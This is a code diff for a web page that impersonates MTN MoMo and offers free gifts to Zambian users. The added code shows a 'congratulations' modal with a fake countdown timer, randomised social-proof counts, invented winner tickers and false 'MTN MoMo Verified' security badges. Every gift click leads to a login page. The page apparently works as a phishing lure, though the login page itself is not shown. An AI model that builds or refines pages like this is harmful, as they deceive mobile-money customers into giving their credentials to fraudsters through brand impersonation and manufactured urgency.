@@ -32,7 +32,7 @@
             max-width: 480px;
             background: linear-gradient(135deg, #0047AB, #002D7A);
             border-radius: 12px;
-            padding: 10px 16px;
+            padding: 10px 14px;
             margin-bottom: 15px;
             overflow: hidden;
             position: relative;
@@ -47,13 +47,14 @@
             color: #1a1a2e;
             font-size: 9px;
             font-weight: 800;
-            padding: 2px 8px;
+            padding: 3px 9px;
             border-radius: 20px;
             flex-shrink: 0;
             display: flex;
             align-items: center;
             gap: 4px;
             animation: pulse 1.5s infinite;
+            letter-spacing: 0.5px;
         }
         
         .live-ticker .live-badge .dot {
@@ -79,7 +80,7 @@
             flex: 1;
             overflow: hidden;
             position: relative;
-            height: 20px;
+            height: 22px;
         }
         
         .live-ticker .ticker-text {
@@ -88,12 +89,42 @@
             color: white;
             font-size: 12px;
             font-weight: 500;
-            animation: tickerMove 20s linear infinite;
+            animation: tickerMove 60s linear infinite;
+            display: flex;
+            align-items: center;
+            height: 100%;
+        }
+        
+        .live-ticker .ticker-text .tick-item {
+            display: inline-flex;
+            align-items: center;
+            margin-right: 40px;
+            gap: 5px;
+        }
+        
+        .live-ticker .ticker-text .tick-item .check {
+            color: #FFC100;
+            font-weight: 800;
+        }
+        
+        .live-ticker .ticker-text .tick-item .phone {
+            font-weight: 700;
+            color: #FFC100;
+        }
+        
+        .live-ticker .ticker-text .tick-item .gift-name {
+            font-weight: 500;
+            color: white;
+        }
+        
+        .live-ticker .ticker-text .tick-item .gift-value {
+            font-weight: 700;
+            color: #FFC100;
         }
         
         @keyframes tickerMove {
-            0% { transform: translateX(100%); }
-            100% { transform: translateX(-100%); }
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
         }
         
         /* ===== HEADER ===== */
@@ -102,20 +133,12 @@
             max-width: 480px;
             padding: 15px 20px;
             display: flex;
-            justify-content: space-between;
+            justify-content: center;
             align-items: center;
             background: white;
             border-radius: 16px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.05);
             margin-bottom: 15px;
-        }
-        
-        .menu-btn {
-            font-size: 24px;
-            background: none;
-            border: none;
-            cursor: pointer;
-            color: #333;
         }
         
         .logo {
@@ -125,13 +148,6 @@
         
         .logo-mtn { color: #FFC100; }
         .logo-momo { color: #0047AB; }
-        
-        .login-link {
-            color: #0047AB;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 14px;
-        }
         
         /* ===== CARD ===== */
         .card {
@@ -286,65 +302,6 @@
             font-size: 10px;
         }
         
-        /* ===== REGISTER BOX ===== */
-        .register-box {
-            background: linear-gradient(135deg, #0047AB, #002D7A);
-            border-radius: 14px;
-            padding: 20px;
-            text-align: center;
-            color: white;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .register-box::before {
-            content: '🎁';
-            position: absolute;
-            top: -20px;
-            right: -10px;
-            font-size: 80px;
-            opacity: 0.1;
-        }
-        
-        .register-box .box-title {
-            font-size: 18px;
-            font-weight: 800;
-            margin-bottom: 4px;
-        }
-        
-        .register-box .box-sub {
-            font-size: 13px;
-            opacity: 0.9;
-            margin-bottom: 12px;
-        }
-        
-        .register-box .box-sub .highlight {
-            color: #FFC100;
-            font-weight: 700;
-        }
-        
-        .register-box .register-btn {
-            width: 100%;
-            padding: 15px;
-            background: #FFC100;
-            color: #1a1a2e;
-            border: none;
-            border-radius: 50px;
-            font-size: 17px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        
-        .register-box .register-btn:hover {
-            transform: scale(1.02);
-            box-shadow: 0 8px 25px rgba(255,193,0,0.35);
-        }
-        
         /* ===== STATS ===== */
         .stats {
             display: grid;
@@ -438,29 +395,249 @@
             font-weight: 600;
         }
         
-        /* ===== NOTIFICATION POPUP ===== */
-        .notification {
+        /* ===== CELEBRATION MODAL ===== */
+        .modal-overlay {
             position: fixed;
-            bottom: 80px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #1a1a2e;
-            color: white;
-            padding: 12px 24px;
-            border-radius: 14px;
-            font-size: 13px;
-            font-weight: 600;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
-            z-index: 100;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
             display: none;
-            max-width: 400px;
-            text-align: center;
-            animation: slideUp 0.4s ease;
+            justify-content: center;
+            align-items: center;
+            z-index: 3000;
+            padding: 20px;
+            animation: fadeIn 0.3s ease;
+            backdrop-filter: blur(4px);
         }
         
-        @keyframes slideUp {
-            0% { transform: translateX(-50%) translateY(20px); opacity: 0; }
-            100% { transform: translateX(-50%) translateY(0); opacity: 1; }
+        .modal-overlay.show {
+            display: flex;
+        }
+        
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+        
+        .modal-content {
+            background: white;
+            border-radius: 28px;
+            padding: 0;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.4);
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            max-height: 92vh;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        @keyframes popIn {
+            0% { transform: scale(0.7); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
+        .modal-header {
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            padding: 30px 25px 25px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .modal-header::before {
+            content: '🎉🎊🎁';
+            position: absolute;
+            top: -10px;
+            left: 0;
+            right: 0;
+            font-size: 30px;
+            opacity: 0.15;
+            letter-spacing: 8px;
+        }
+        
+        .modal-congrats {
+            font-size: 13px;
+            font-weight: 700;
+            color: #FFC100;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 6px;
+            position: relative;
+        }
+        
+        .modal-header-title {
+            font-size: 26px;
+            font-weight: 800;
+            color: white;
+            margin-bottom: 4px;
+            position: relative;
+        }
+        
+        .modal-header-sub {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.85);
+            position: relative;
+        }
+        
+        .modal-body {
+            padding: 24px 25px 28px;
+            text-align: center;
+        }
+        
+        .modal-gift-icon {
+            font-size: 60px;
+            margin-bottom: 8px;
+            display: block;
+            animation: giftBounce 1.5s infinite;
+        }
+        
+        @keyframes giftBounce {
+            0%, 100% { transform: translateY(0) scale(1); }
+            50% { transform: translateY(-6px) scale(1.05); }
+        }
+        
+        .modal-gift-name {
+            font-size: 22px;
+            font-weight: 800;
+            color: #1a1a2e;
+            margin-bottom: 4px;
+        }
+        
+        .modal-gift-value {
+            font-size: 26px;
+            font-weight: 800;
+            color: #0047AB;
+            margin-bottom: 18px;
+        }
+        
+        .modal-timer {
+            background: linear-gradient(135deg, #ffebee, #ffcdd2);
+            border: 1px solid #ef9a9a;
+            border-radius: 12px;
+            padding: 10px 14px;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .modal-timer .timer-icon {
+            font-size: 18px;
+        }
+        
+        .modal-timer .timer-text {
+            font-size: 13px;
+            font-weight: 700;
+            color: #c62828;
+        }
+        
+        .modal-timer .timer-count {
+            font-size: 15px;
+            font-weight: 800;
+            color: #c62828;
+            font-variant-numeric: tabular-nums;
+        }
+        
+        .modal-social {
+            background: #f8f9ff;
+            border-radius: 12px;
+            padding: 10px 14px;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .modal-social .social-icon {
+            font-size: 18px;
+        }
+        
+        .modal-social .social-text {
+            font-size: 12.5px;
+            color: #0047AB;
+            font-weight: 600;
+        }
+        
+        .modal-requirements {
+            background: #f0f9ff;
+            border-radius: 12px;
+            padding: 12px 14px;
+            margin-bottom: 14px;
+            text-align: left;
+        }
+        
+        .modal-requirements .req-title {
+            font-size: 11px;
+            font-weight: 700;
+            color: #0047AB;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+            text-align: center;
+        }
+        
+        .modal-requirements .req-item {
+            font-size: 12px;
+            color: #1a1a2e;
+            font-weight: 500;
+            padding: 2px 0;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .modal-requirements .req-item .check {
+            color: #1e7e34;
+            font-weight: 800;
+        }
+        
+        .modal-trust {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 11px;
+            color: #666;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+        
+        .modal-btn {
+            width: 100%;
+            padding: 17px;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 17px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 8px 25px rgba(0, 71, 171, 0.35);
+            font-family: 'Inter', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .modal-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 12px 35px rgba(0, 71, 171, 0.45);
+        }
+        
+        .modal-btn:active {
+            transform: scale(0.98);
+        }
+        
+        .modal-footer-note {
+            font-size: 10.5px;
+            color: #aaa;
+            margin-top: 12px;
+            font-weight: 500;
         }
         
         @media (max-width: 480px) {
@@ -473,14 +650,18 @@
             .gift-card { padding: 12px 6px; }
             .gift-card .icon { font-size: 26px; }
             .gift-card .name { font-size: 10px; }
-            .gift-card .value { font-size: 12px; }
+            .gift-card .value { font-size: 11px; }
             .stats { grid-template-columns: repeat(3, 1fr); gap: 6px; }
             .stat-item .number { font-size: 18px; }
             .stat-item { padding: 10px 6px; }
-            .register-box .box-title { font-size: 16px; }
-            .register-box .register-btn { font-size: 15px; padding: 13px; }
             .live-ticker { padding: 8px 12px; }
             .live-ticker .ticker-text { font-size: 11px; }
+            .modal-header { padding: 24px 20px 20px; }
+            .modal-header-title { font-size: 22px; }
+            .modal-body { padding: 20px 18px 22px; }
+            .modal-gift-icon { font-size: 48px; }
+            .modal-gift-name { font-size: 18px; }
+            .modal-gift-value { font-size: 22px; }
         }
         
         @media (max-width: 380px) {
@@ -497,22 +678,15 @@
             LIVE
         </div>
         <div class="ticker-wrapper">
-            <div class="ticker-text" id="tickerText">
-                +260945781234 just received Cash Gift ZMW 1,856 • 
-                +260971235678 just received Airtime ZMW 179 • 
-                +260965412345 just received Data Bundle 5GB • 
-                +260978903456 just received Shopping Voucher ZMW 2,500 •
-            </div>
+            <div class="ticker-text" id="tickerText"></div>
         </div>
     </div>
 
     <!-- ===== HEADER ===== -->
     <header>
-        <button class="menu-btn" aria-label="Menu">☰</button>
         <div class="logo">
             <span class="logo-mtn">MTN</span><span class="logo-momo">MoMo</span>
         </div>
-        <a href="login.html" class="login-link">Login</a>
     </header>
 
     <!-- ===== MAIN CARD ===== -->
@@ -525,149 +699,179 @@
         <div class="gifts-section">
             <div class="gifts-title">
                 <span class="emoji">🎁</span> Today's Featured Gifts
-                <span class="count">18 Offers</span>
+                <span class="count">24 Offers</span>
             </div>
             
-            <!-- Gift Grid - 18 Gifts -->
+            <!-- Gift Grid - 24 Gifts -->
             <div class="gift-grid">
-                <div class="gift-card" onclick="selectGift('Airtime', 'ZMW 179', '📱', this)">
+                <div class="gift-card" onclick="showGiftModal('Airtime', 'ZMW 369', '📱')">
                     <span class="icon">📱</span>
                     <div class="name">Airtime</div>
-                    <div class="value">ZMW 179</div>
+                    <div class="value">ZMW 369</div>
                     <span class="badge free">FREE</span>
                     <div class="users"><span class="emoji">👤</span> 2.4k claimed</div>
                 </div>
-                <div class="gift-card" onclick="selectGift('Data Bundle', '5GB', '🌐', this)">
+                <div class="gift-card" onclick="showGiftModal('Data Bundle', '10GB', '🌐')">
                     <span class="icon">🌐</span>
                     <div class="name">Data Bundle</div>
-                    <div class="value">5GB</div>
+                    <div class="value">10GB</div>
                     <span class="badge hot">🔥 HOT</span>
                     <div class="users"><span class="emoji">👤</span> 5.1k claimed</div>
                 </div>
-                <div class="gift-card" onclick="selectGift('Data Bundle Plus', '10GB', '📶', this)">
+                <div class="gift-card" onclick="showGiftModal('Data Bundle Plus', '20GB', '📶')">
                     <span class="icon">📶</span>
                     <div class="name">Data Bundle+</div>
-                    <div class="value">10GB</div>
+                    <div class="value">20GB</div>
                     <span class="badge popular">⭐ POPULAR</span>
                     <div class="users"><span class="emoji">👤</span> 3.8k claimed</div>
                 </div>
-                <div class="gift-card" onclick="selectGift('Cash Reward', 'ZMW 1,856', '💰', this)">
+                <div class="gift-card" onclick="showGiftModal('Cash Reward', 'ZMW 2,500', '💰')">
                     <span class="icon">💰</span>
                     <div class="name">Cash Reward</div>
-                    <div class="value">ZMW 1,856</div>
+                    <div class="value">ZMW 2,500</div>
                     <span class="badge limited">LIMITED</span>
                     <div class="users"><span class="emoji">👤</span> 892 claimed</div>
                 </div>
-                <div class="gift-card" onclick="selectGift('Shopping Voucher', 'ZMW 2,500', '🛒', this)">
+                <div class="gift-card" onclick="showGiftModal('Shopping Voucher', 'ZMW 3,500', '🛒')">
                     <span class="icon">🛒</span>
                     <div class="name">Shopping Voucher</div>
-                    <div class="value">ZMW 2,500</div>
+                    <div class="value">ZMW 3,500</div>
                     <span class="badge hot">🔥 HOT</span>
                     <div class="users"><span class="emoji">👤</span> 1.2k claimed</div>
                 </div>
-                <div class="gift-card" onclick="selectGift('Food Voucher', 'ZMW 1,200', '🍔', this)">
+                <div class="gift-card" onclick="showGiftModal('Food Voucher', 'ZMW 1,800', '🍔')">
                     <span class="icon">🍔</span>
                     <div class="name">Food Voucher</div>
-                    <div class="value">ZMW 1,200</div>
+                    <div class="value">ZMW 1,800</div>
                     <span class="badge new">🆕 NEW</span>
                     <div class="users"><span class="emoji">👤</span> 456 claimed</div>
                 </div>
-                <div class="gift-card" onclick="selectGift('Music Streaming', '3 Months', '🎵', this)">
+                <div class="gift-card" onclick="showGiftModal('Music Streaming', '6 Months', '🎵')">
                     <span class="icon">🎵</span>
                     <div class="name">Music Streaming</div>
-                    <div class="value">3 Months</div>
+                    <div class="value">6 Months</div>
                     <span class="badge popular">⭐ POPULAR</span>
                     <div class="users"><span class="emoji">👤</span> 3.7k claimed</div>
                 </div>
-                <div class="gift-card" onclick="selectGift('Video Bundle', '10GB', '📺', this)">
+                <div class="gift-card" onclick="showGiftModal('Video Bundle', '20GB', '📺')">
                     <span class="icon">📺</span>
                     <div class="name">Video Bundle</div>
-                    <div class="value">10GB</div>
+                    <div class="value">20GB</div>
                     <span class="badge free">FREE</span>
                     <div class="users"><span class="emoji">👤</span> 1.8k claimed</div>
                 </div>
-                <div class="gift-card" onclick="selectGift('Gaming Bundle', 'ZMW 500', '🎮', this)">
+                <div class="gift-card" onclick="showGiftModal('Gaming Bundle', 'ZMW 1,000', '🎮')">
                     <span class="icon">🎮</span>
                     <div class="name">Gaming Bundle</div>
-                    <div class="value">ZMW 500</div>
+                    <div class="value">ZMW 1,000</div>
                     <span class="badge new">🆕 NEW</span>
                     <div class="users"><span class="emoji">👤</span> 324 claimed</div>
                 </div>
-                <div class="gift-card" onclick="selectGift('Social Media Bundle', '2GB', '📱', this)">
+                <div class="gift-card" onclick="showGiftModal('Social Media Bundle', '5GB', '📱')">
                     <span class="icon">📱</span>
                     <div class="name">Social Media</div>
-                    <div class="value">2GB</div>
+                    <div class="value">5GB</div>
                     <span class="badge free">FREE</span>
                     <div class="users"><span class="emoji">👤</span> 4.2k claimed</div>
                 </div>
-                <div class="gift-card" onclick="selectGift('Night Data', '15GB', '🌙', this)">
+                <div class="gift-card" onclick="showGiftModal('Night Data', '30GB', '🌙')">
                     <span class="icon">🌙</span>
                     <div class="name">Night Data</div>
-                    <div class="value">15GB</div>
+                    <div class="value">30GB</div>
                     <span class="badge hot">🔥 HOT</span>
                     <div class="users"><span class="emoji">👤</span> 2.1k claimed</div>
                 </div>
-                <div class="gift-card" onclick="selectGift('Weekend Bundle', '7GB', '🎉', this)">
+                <div class="gift-card" onclick="showGiftModal('Weekend Bundle', '15GB', '🎉')">
                     <span class="icon">🎉</span>
                     <div class="name">Weekend Bundle</div>
-                    <div class="value">7GB</div>
+                    <div class="value">15GB</div>
                     <span class="badge popular">⭐ POPULAR</span>
                     <div class="users"><span class="emoji">👤</span> 1.9k claimed</div>
                 </div>
-                <div class="gift-card" onclick="selectGift('Fuel Voucher', 'ZMW 800', '⛽', this)">
+                <div class="gift-card" onclick="showGiftModal('Fuel Voucher', 'ZMW 1,200', '⛽')">
                     <span class="icon">⛽</span>
                     <div class="name">Fuel Voucher</div>
-                    <div class="value">ZMW 800</div>
+                    <div class="value">ZMW 1,200</div>
                     <span class="badge limited">LIMITED</span>
                     <div class="users"><span class="emoji">👤</span> 567 claimed</div>
                 </div>
-                <div class="gift-card" onclick="selectGift('Fashion Voucher', 'ZMW 1,500', '👗', this)">
+                <div class="gift-card" onclick="showGiftModal('Fashion Voucher', 'ZMW 2,200', '👗')">
                     <span class="icon">👗</span>
                     <div class="name">Fashion Voucher</div>
-                    <div class="value">ZMW 1,500</div>
+                    <div class="value">ZMW 2,200</div>
                     <span class="badge new">🆕 NEW</span>
                     <div class="users"><span class="emoji">👤</span> 234 claimed</div>
                 </div>
-                <div class="gift-card" onclick="selectGift('Grocery Voucher', 'ZMW 2,000', '🛍️', this)">
+                <div class="gift-card" onclick="showGiftModal('Grocery Voucher', 'ZMW 3,000', '🛍️')">
                     <span class="icon">🛍️</span>
                     <div class="name">Grocery Voucher</div>
-                    <div class="value">ZMW 2,000</div>
+                    <div class="value">ZMW 3,000</div>
                     <span class="badge hot">🔥 HOT</span>
                     <div class="users"><span class="emoji">👤</span> 1.4k claimed</div>
                 </div>
-                <div class="gift-card" onclick="selectGift('Movie Tickets', '2 Tickets', '🎬', this)">
+                <div class="gift-card" onclick="showGiftModal('Movie Tickets', '4 Tickets', '🎬')">
                     <span class="icon">🎬</span>
                     <div class="name">Movie Tickets</div>
-                    <div class="value">2 Tickets</div>
+                    <div class="value">4 Tickets</div>
                     <span class="badge popular">⭐ POPULAR</span>
                     <div class="users"><span class="emoji">👤</span> 2.8k claimed</div>
                 </div>
-                <div class="gift-card" onclick="selectGift('Health Insurance', '1 Month', '🏥', this)">
+                <div class="gift-card" onclick="showGiftModal('Health Insurance', '3 Months', '🏥')">
                     <span class="icon">🏥</span>
                     <div class="name">Health Insurance</div>
-                    <div class="value">1 Month</div>
+                    <div class="value">3 Months</div>
                     <span class="badge free">FREE</span>
                     <div class="users"><span class="emoji">👤</span> 1.1k claimed</div>
                 </div>
-                <div class="gift-card" onclick="selectGift('Education Bundle', 'ZMW 3,000', '📚', this)">
+                <div class="gift-card" onclick="showGiftModal('Education Bundle', 'ZMW 5,000', '📚')">
                     <span class="icon">📚</span>
                     <div class="name">Education Bundle</div>
-                    <div class="value">ZMW 3,000</div>
+                    <div class="value">ZMW 5,000</div>
                     <span class="badge limited">LIMITED</span>
                     <div class="users"><span class="emoji">👤</span> 345 claimed</div>
                 </div>
-            </div>
-            
-            <!-- Register Box -->
-            <div class="register-box">
-                <div class="box-title">🎯 You Qualify for a Free Gift!</div>
-                <div class="box-sub">
-                    <span class="highlight">12,847 users</span> have already claimed their gifts. 
-                    Don't miss out!
+                <div class="gift-card" onclick="showGiftModal('Netflix Subscription', '3 Months', '🎥')">
+                    <span class="icon">🎥</span>
+                    <div class="name">Netflix</div>
+                    <div class="value">3 Months</div>
+                    <span class="badge hot">🔥 HOT</span>
+                    <div class="users"><span class="emoji">👤</span> 2.6k claimed</div>
                 </div>
-                <button class="register-btn" id="registerBtn">
-                    🎁 CLAIM YOUR GIFT
-                </button>
+                <div class="gift-card" onclick="showGiftModal('Uber Voucher', 'ZMW 1,500', '🚕')">
+                    <span class="icon">🚕</span>
+                    <div class="name">Uber Voucher</div>
+                    <div class="value">ZMW 1,500</div>
+                    <span class="badge new">🆕 NEW</span>
+                    <div class="users"><span class="emoji">👤</span> 789 claimed</div>
+                </div>
+                <div class="gift-card" onclick="showGiftModal('Coffee Voucher', 'ZMW 500', '☕')">
+                    <span class="icon">☕</span>
+                    <div class="name">Coffee Voucher</div>
+                    <div class="value">ZMW 500</div>
+                    <span class="badge free">FREE</span>
+                    <div class="users"><span class="emoji">👤</span> 1.5k claimed</div>
+                </div>
+                <div class="gift-card" onclick="showGiftModal('Beauty Voucher', 'ZMW 1,800', '💄')">
+                    <span class="icon">💄</span>
+                    <div class="name">Beauty Voucher</div>
+                    <div class="value">ZMW 1,800</div>
+                    <span class="badge popular">⭐ POPULAR</span>
+                    <div class="users"><span class="emoji">👤</span> 923 claimed</div>
+                </div>
+                <div class="gift-card" onclick="showGiftModal('Sports Bundle', 'ZMW 2,000', '⚽')">
+                    <span class="icon">⚽</span>
+                    <div class="name">Sports Bundle</div>
+                    <div class="value">ZMW 2,000</div>
+                    <span class="badge hot">🔥 HOT</span>
+                    <div class="users"><span class="emoji">👤</span> 1.7k claimed</div>
+                </div>
+                <div class="gift-card" onclick="showGiftModal('Book Bundle', 'ZMW 1,000', '📖')">
+                    <span class="icon">📖</span>
+                    <div class="name">Book Bundle</div>
+                    <div class="value">ZMW 1,000</div>
+                    <span class="badge new">🆕 NEW</span>
+                    <div class="users"><span class="emoji">👤</span> 567 claimed</div>
+                </div>
             </div>
         </div>
     </div>
@@ -714,10 +918,6 @@
             <span class="icon">🏠</span>
             Home
         </button>
-        <button class="nav-item" onclick="window.location.href='application.html'">
-            <span class="icon">🎁</span>
-            Gifts
-        </button>
         <button class="nav-item" onclick="window.location.href='login.html'">
             <span class="icon">🔐</span>
             Login
@@ -730,15 +930,56 @@
         <a href="#" onclick="alert('Terms & Conditions')">Terms</a>
     </footer>
 
-    <!-- Notification Popup -->
-    <div class="notification" id="notification"></div>
+    <!-- ===== CELEBRATION MODAL ===== -->
+    <div class="modal-overlay" id="giftModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-congrats">🎉 CONGRATULATIONS! 🎉</div>
+                <div class="modal-header-title">You're about to claim</div>
+                <div class="modal-header-sub">Complete this to receive your gift</div>
+            </div>
+            
+            <div class="modal-body">
+                <span class="modal-gift-icon" id="modalGiftIcon">🎁</span>
+                <div class="modal-gift-name" id="modalGiftName">Airtime</div>
+                <div class="modal-gift-value" id="modalGiftValue">ZMW 369</div>
+                
+                <div class="modal-timer">
+                    <span class="timer-icon">⏳</span>
+                    <span class="timer-text">Expires in:</span>
+                    <span class="timer-count" id="timerCount">04:59</span>
+                </div>
+                
+                <div class="modal-social">
+                    <span class="social-icon">👥</span>
+                    <span class="social-text"><strong id="socialCount">23</strong> people claimed this in the last hour</span>
+                </div>
+                
+                <div class="modal-requirements">
+                    <div class="req-title">Requirements</div>
+                    <div class="req-item"><span class="check">✔</span> Must be 18 years or older</div>
+                    <div class="req-item"><span class="check">✔</span> Active MTN MoMo account</div>
+                    <div class="req-item"><span class="check">✔</span> Valid phone number</div>
+                </div>
+                
+                <div class="modal-trust">
+                    🔒 100% Secure • MTN MoMo Verified
+                </div>
+                
+                <button class="modal-btn" onclick="proceedToLogin()">PROCEED →</button>
+                
+                <div class="modal-footer-note">
+                    Free to claim • No hidden fees
+                </div>
+            </div>
+        </div>
+    </div>
 
     <script>
         // ============================================
         // STATS - Auto-increment animation
         // ============================================
         function animateCounter(element, target, duration = 2000) {
-            const start = 0;
             const startTime = performance.now();
             
             function update(currentTime) {
@@ -760,97 +1001,114 @@
         window.addEventListener('load', () => {
             animateCounter(document.getElementById('usersCount'), 12847);
             animateCounter(document.getElementById('giftsCount'), 15723);
-            animateCounter(document.getElementById('offersCount'), 18);
+            animateCounter(document.getElementById('offersCount'), 24);
         });
 
         // ============================================
-        // GIFT SELECTION
+        // LIVE TICKER - Partial phone numbers
         // ============================================
-        function selectGift(name, value, icon, element) {
-            // Store selected gift
+        const tickerMessages = [
+            { phone: '+26096...', gift: 'Airtime', value: 'ZMW 369' },
+            { phone: '+26097...', gift: 'Data Bundle', value: '10GB' },
+            { phone: '+26095...', gift: 'Cash Reward', value: 'ZMW 2,500' },
+            { phone: '+26096...', gift: 'Shopping Voucher', value: 'ZMW 3,500' },
+            { phone: '+26099...', gift: 'Data Bundle Plus', value: '20GB' },
+            { phone: '+26097...', gift: 'Food Voucher', value: 'ZMW 1,800' },
+            { phone: '+26094...', gift: 'Music Streaming', value: '6 Months' },
+            { phone: '+26096...', gift: 'Video Bundle', value: '20GB' },
+            { phone: '+26098...', gift: 'Gaming Bundle', value: 'ZMW 1,000' },
+            { phone: '+26095...', gift: 'Night Data', value: '30GB' },
+            { phone: '+26097...', gift: 'Weekend Bundle', value: '15GB' },
+            { phone: '+26096...', gift: 'Fuel Voucher', value: 'ZMW 1,200' },
+            { phone: '+26099...', gift: 'Fashion Voucher', value: 'ZMW 2,200' },
+            { phone: '+26094...', gift: 'Grocery Voucher', value: 'ZMW 3,000' },
+            { phone: '+26098...', gift: 'Movie Tickets', value: '4 Tickets' },
+            { phone: '+26095...', gift: 'Health Insurance', value: '3 Months' },
+            { phone: '+26097...', gift: 'Education Bundle', value: 'ZMW 5,000' },
+            { phone: '+26096...', gift: 'Netflix', value: '3 Months' },
+            { phone: '+26099...', gift: 'Uber Voucher', value: 'ZMW 1,500' },
+            { phone: '+26094...', gift: 'Coffee Voucher', value: 'ZMW 500' },
+            { phone: '+26098...', gift: 'Beauty Voucher', value: 'ZMW 1,800' },
+            { phone: '+26095...', gift: 'Sports Bundle', value: 'ZMW 2,000' },
+            { phone: '+26097...', gift: 'Book Bundle', value: 'ZMW 1,000' },
+            { phone: '+26096...', gift: 'Social Media', value: '5GB' }
+        ];
+
+        function buildTickerContent() {
+            let content = '';
+            // Build twice for seamless infinite loop
+            for (let loop = 0; loop < 2; loop++) {
+                tickerMessages.forEach(msg => {
+                    content += `<span class="tick-item"><span class="check">✔</span> <span class="phone">${msg.phone}</span> <span class="gift-name">claimed</span> <span class="gift-name">${msg.gift}</span> <span class="gift-value">${msg.value}</span></span>`;
+                });
+            }
+            return content;
+        }
+
+        document.getElementById('tickerText').innerHTML = buildTickerContent();
+
+        // ============================================
+        // GIFT MODAL
+        // ============================================
+        let timerInterval = null;
+        let currentGift = {};
+
+        function showGiftModal(name, value, icon) {
+            currentGift = { name, value, icon };
             localStorage.setItem('selectedGift', name);
             localStorage.setItem('selectedGiftValue', value);
             localStorage.setItem('selectedGiftIcon', icon);
             
-            // Visual feedback
-            document.querySelectorAll('.gift-card').forEach(card => {
-                card.style.borderColor = '#e8ecf5';
-                card.style.background = 'white';
-            });
-            element.style.borderColor = '#0047AB';
-            element.style.background = '#f0f4ff';
+            document.getElementById('modalGiftIcon').textContent = icon;
+            document.getElementById('modalGiftName').textContent = name;
+            document.getElementById('modalGiftValue').textContent = value;
             
-            // Show notification
-            showNotification(`🎁 ${name} (${value}) selected! Click "CLAIM YOUR GIFT" to proceed.`);
+            const socialCount = Math.floor(Math.random() * 40) + 15;
+            document.getElementById('socialCount').textContent = socialCount;
             
-            console.log('🎁 Gift selected:', name, '-', value);
+            document.getElementById('giftModal').classList.add('show');
+            
+            startTimer(300);
+            
+            console.log('🎁 Gift modal opened:', name, '-', value);
+        }
+
+        function startTimer(seconds) {
+            if (timerInterval) clearInterval(timerInterval);
+            
+            let remaining = seconds;
+            updateTimerDisplay(remaining);
+            
+            timerInterval = setInterval(() => {
+                remaining--;
+                if (remaining <= 0) {
+                    clearInterval(timerInterval);
+                    remaining = 0;
+                }
+                updateTimerDisplay(remaining);
+            }, 1000);
+        }
+
+        function updateTimerDisplay(seconds) {
+            const mins = Math.floor(seconds / 60);
+            const secs = seconds % 60;
+            document.getElementById('timerCount').textContent = 
+                String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
         }
 
         // ============================================
-        // NOTIFICATION
+        // PROCEED TO LOGIN
         // ============================================
-        function showNotification(message) {
-            const notification = document.getElementById('notification');
-            notification.innerHTML = message;
-            notification.style.display = 'block';
-            
-            clearTimeout(window.notificationTimeout);
-            window.notificationTimeout = setTimeout(() => {
-                notification.style.display = 'none';
-            }, 3000);
+        function proceedToLogin() {
+            if (timerInterval) clearInterval(timerInterval);
+            console.log('➡️ Proceeding to login with gift:', currentGift.name);
+            window.location.href = 'login.html';
         }
-
-        // ============================================
-        // REGISTER BUTTON - REQUIRES GIFT SELECTION
-        // ============================================
-        document.getElementById('registerBtn').addEventListener('click', function() {
-            const selectedGift = localStorage.getItem('selectedGift');
-            
-            if (!selectedGift) {
-                showNotification('⚠️ Please select a gift first by tapping on any gift card above!');
-                return;
-            }
-            
-            console.log('➡️ Proceeding with gift:', selectedGift);
-            window.location.href = 'details.html';
-        });
-
-        // ============================================
-        // LIVE TICKER - Dynamic updates
-        // ============================================
-        const liveMessages = [
-            '+260945781234 just received Cash Gift ZMW 1,856',
-            '+260971235678 just received Airtime ZMW 179',
-            '+260965412345 just received Data Bundle 5GB',
-            '+260978903456 just received Shopping Voucher ZMW 2,500',
-            '+260967890123 just received Music Streaming 3 Months',
-            '+260952345678 just received Fuel Voucher ZMW 800',
-            '+260983456789 just received Grocery Voucher ZMW 2,000',
-            '+260974567890 just received Video Bundle 10GB',
-            '+260961234567 just received Food Voucher ZMW 1,200',
-            '+260999876543 just received Education Bundle ZMW 3,000',
-            '+260956789012 just received Fashion Voucher ZMW 1,500',
-            '+260988765432 just received Night Data 15GB',
-            '+260943210987 just received Gaming Bundle ZMW 500',
-            '+260975432109 just received Movie Tickets 2 Tickets',
-            '+260964321098 just received Health Insurance 1 Month'
-        ];
-
-        let tickerIndex = 0;
-        setInterval(() => {
